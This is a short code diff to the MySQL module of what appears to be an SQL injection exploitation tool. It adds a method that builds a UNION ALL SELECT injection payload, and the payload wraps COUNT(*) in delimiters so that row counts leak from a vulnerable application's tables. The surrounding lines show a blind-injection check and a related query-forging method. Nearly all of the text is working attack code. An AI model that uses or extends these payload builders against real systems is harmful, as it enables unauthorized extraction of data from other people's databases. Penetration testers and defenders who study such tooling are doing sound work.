@@ -99,6 +99,16 @@ class MysqlMole(DbmsMole):
     def dbms_check_blind_query(cls):
         return ' and 0 < (select length(@@version)) '
 
+    def forge_count_query(self, column_count, fields, table_name, injectable_field, where = "1=1"):
+        query = " and 1=0 UNION ALL SELECT "
+        query_list = list(map(str, range(column_count)))
+        query_list[injectable_field] = ("CONCAT(" + MysqlMole.out_delimiter + ",COUNT(*)," + MysqlMole.out_delimiter + ")")
+        query += ','.join(query_list)
+        if len(table_name) > 0:
+            query += " from " + table_name 
+            query += " where " + self.parse_condition(where)
+        return query
+
     def forge_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
         query = " and 1=0 UNION ALL SELECT "
         query_list = list(map(str, range(column_count)))
